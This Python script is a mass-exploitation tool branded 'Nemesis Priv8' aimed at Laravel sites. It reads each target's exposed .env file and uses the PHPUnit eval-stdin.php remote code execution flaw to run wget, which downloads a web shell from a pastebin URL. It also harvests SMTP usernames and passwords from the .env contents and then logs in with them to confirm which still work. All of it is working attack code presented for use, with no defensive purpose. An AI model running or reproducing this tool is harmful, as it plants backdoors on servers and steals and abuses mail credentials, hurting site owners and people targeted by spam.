import os
import re
import requests
from colorama import Fore, init, Style
from multiprocessing import Pool
import sys
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
init()
yl = Fore.YELLOW
red = Fore.RED
gr = Fore.GREEN
res = Style.RESET_ALL

headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"}

def shell(site):
     try:
         test = '<?php echo php_uname("a"); ?>'
         up = '<?php system("wget https://pastebin.com/raw/0Wz8SGG2 -O nemesis.php"); ?>'
         cek = requests.post(site + '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=test, headers=headers, timeout=13)
         if 'Linux' in cek.text:
             shellup = requests.post(site + '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=up, headers=headers,  timeout=13)
             if shellup.ok:
                 print(f"{site} {gr}[SHELL]{res}")
                 open('shell.txt', 'a').write(site + '/vendor/phpunit/phpunit/src/Util/PHP/nemesis.php' + '\n')
             else:
                 print(f"{site} {yl}[ UPLOAD FAILED ]{res}")
                 open('Failed.txt', 'a').write(site + '\n')
         else:
             print(f"{site} {red}[ NOT VULN ]{res}")
     except:
         pass
def get_smtp(site, url):
    try:
        if "APP_NAME" in url:
            host = re.findall("\nMAIL_HOST=(.*?)\n", url)[0]
            port = re.findall("\nMAIL_PORT=(.*?)\n",url)[0]
            user = re.findall("\nMAIL_USERNAME=(.*?)\n", url)[0]
            pswd = re.findall("\nMAIL_PASSWORD=(.*?)\n", url)[0]
            encr = re.findall("\nMAIL_ENCRYPTION=(.*?)\n", url)[0]


            smtp = host+'|'+port+'|'+user+'|'+pswd+'|'+encr
            smtp = smtp.replace('\r', '').replace('"', '').replace("'", "")
            if "null" in smtp:
                print(f"{site} {yl}[NULL]{res}")
            else:
                print(f"{site} {gr}[ SMTP ]{res}")
                open("SMTP.txt", "a+").write(smtp + "\n")
        else:
            print(f"{site} {yl}[NULL]{res}")
    except:
        pass
def ssl(smtp, reci):
    try:
        smtp = smtp.split("|")

        # Create a message object for each SMTP server
        message = MIMEMultipart()
        message["From"] = smtp[2]
        message["To"] = reci
        message["Subject"] = f"Nemesis Priv8 ({smtp[2]})"
        body = f"mail sent using Laravel SMTP and SHELL Upload {smtp}"
        message.attach(MIMEText(body, "plain"))

        try:
            # Connect to the SMTP server and send the message
            with smtplib.SMTP_SSL(smtp[0], int(smtp[1])) as server:
                server.login(smtp[2], smtp[3])
                server.sendmail(smtp[2], reci, message.as_string())
            print(f"{gr}Sent success {smtp[0]}{res}")
        except Exception as e:
            print(f"{red}Bad {smtp[0]}{res}")
    except:
        pass
def tls(smtp, reci):
    try:
        smtp = smtp.strip().split("|")
        message = MIMEMultipart()
        message["From"] = smtp[2]
        message["To"] = reci
        message["Subject"] = f"Nemesis Priv8 ({smtp[2]})"
        body = f"mail sent using Laravel SMTP and SHELL Upload {smtp}"
        message.attach(MIMEText(body, "plain"))

        try:
            with smtplib.SMTP(smtp[0], int(smtp[1])) as server:
                server.starttls()
                server.login(smtp[2], smtp[3])
                server.sendmail(smtp[2], reci, message.as_string())
            print(f"{gr}Sent Success {smtp[0]}{res}")
        except Exception as e:
            print(f"{red}Bad {smtp[0]}{res}")
    except:
        pass
def check():
    try:
        try:
            if os.name == 'nt':
                os.system('cls')
            else:
                os.system('clear')
        except:
            pass
        print(red + "")
        print(red + " Nemesis Priv8")
        print(red + "")
        print(red + " Mass SMTP Checker\n\n")
        site = input(f"{gr}[+] Enter SMTP List : {res}")
        reci = input(f"{gr}[+] Enter Your Mail : {res}")
        smtps = open(site).readlines()
        for smtp in smtps:
            if "ssl" in smtp:
                ssl(smtp, reci)
            else:
                tls(smtp, reci)
    except:
        pass
def fix(site):
    if "://" in site:
        site = site
    else:
        site = "http://" + site
    site = site.replace("\n", "").replace("\r", "")
    try:
        url = requests.get(site + "/.env", headers=headers, timeout=12).text
        if "APP_KEY" in url:
            open('Laravel.txt', 'a').write(site+'\n')
            shell(site)
            get_smtp(site, url)
        elif "/wp-content/" in url:
            open('Wordpress.txt', 'a').write(site + '\n')
        else:

            print(f"{site} {red} [NOT LARAVEL]{res}")
    except:
        pass

def smtp_mail():
    try:
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    except:
        pass
    print(red + "")
    print(red + " Nemesis Priv8")
    print(red + "")
    print(red + " Get SHELL ,SMTP, ETC FROM LARAVEL SITES\n")
    sites = input(f"{gr}[+] Enter Site List : {res}")

    site = open(sites).readlines()
    Thread = 50

    try:
        ThreadPool = Pool(Thread)
        ThreadPool.map(fix, site)
        ThreadPool.close()
        ThreadPool.join()
    except:
        pass

def main():
    try:
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    except:
        pass
    print(red + "")
    print(red + " LARAVEL SMTP and SHELL Upload")
    print(red + "")
    print(red + " Nemesis Priv8")
    print(red + "\n")
    
    print(f"""{gr}
[1] Mass LARAVEL SMTP And SHELL Upload
[2] Mass SMTP Checker
[3] Exit   
    {res}""")
    choice = int(input(f"{gr}[+] Enter Your Choice : {res}"))
    if choice == 1:
        smtp_mail()
    elif choice == 2:
        check()
    elif choice == 3:
        sys.exit(" GoodBye !")
    else:
        sys.exit(" Wrong Input !")


if __name__ == "__main__":
    main()
